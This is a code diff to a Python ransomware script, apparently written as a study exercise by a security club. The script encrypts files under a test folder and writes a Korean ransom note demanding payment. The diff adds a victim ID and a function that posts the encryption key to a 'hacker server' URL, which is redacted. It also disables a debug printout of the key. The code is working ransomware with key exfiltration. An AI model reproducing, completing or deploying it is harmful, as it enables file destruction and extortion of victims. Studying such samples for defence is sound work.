@@ -1,25 +1,20 @@
 import secrets
 import base64
 import os
-
-try:
-    from cryptography.fernet import Fernet #pip install cryptography
-except:
-    __import__("subprocess").call(['pip','install','cryptography'])
-    from cryptography.fernet import Fernet
-
-debug=True
-
+import requests
+from cryptography.fernet import Fernet
+    
 def main():
     encryption_key=generate_encryption_key()
     search_and_encrypt_files(encryption_key)
-    create_and_display_ransom_note()
     
-    if debug:
-        print()
+    your_id=make_id()
+    create_and_display_ransom_note(your_id)
+    send_key(f"{your_id} : {encryption_key.decode()}")
+    
+    if 1==0:
         print(f"생성된 key : {encryption_key.decode()}")
     exit(0)
-
 
 def generate_encryption_key(length=32):
     """
@@ -74,11 +69,10 @@ def search_and_encrypt_files(key):
     files=search_file("C:\\test","all")
     for file in files:
         encrypt_file(file)
-        
     return
 
 
-def create_and_display_ransom_note():
+def create_and_display_ransom_note(id):
     """
     @breif : 사용자에게 요구사항을 알리는 랜섬노트 생성 및 표시
     @param : None
@@ -95,10 +89,11 @@ def create_and_display_ransom_note():
     decode_tool="DecodeTool.py"
     
     with open(ransom_note,"w+",encoding="utf-8") as f:
-        message="""
+        message=f"""
 당신의 컴퓨터는 해킹되었습니다.
 keeper14기 강백준,이영재에게 돈을 입금하세요.
-2024-01-08 keeper 기술문서"""
+2024-01-08 keeper 기술문서
+당신의 아이디 : {id}"""
         f.write(message)
         f.seek(0,0) # fseek(fp,0,SEEK_SET);
         print(f.read())
@@ -137,6 +132,25 @@ print("Decode process completed.")
 
     return
 
+def make_id():
+    """
+    @brief : 복호화 협상을 시도할 아이디 생성
+    @param : None
+    @return : None
+    """
+    return secrets.token_hex(4)
+    
+def send_key(text):
+    """
+    @brief : 해커서버에 암호화키를 전송하는 함수
+    @param : 전송할 메시지
+    @return : None
+    """
+    url = "SECRET"
+    data = {'message': text}
+    response = requests.post(url, data=data)
+    print(response.text)
+    return
 
 if __name__ == "__main__":
     main()
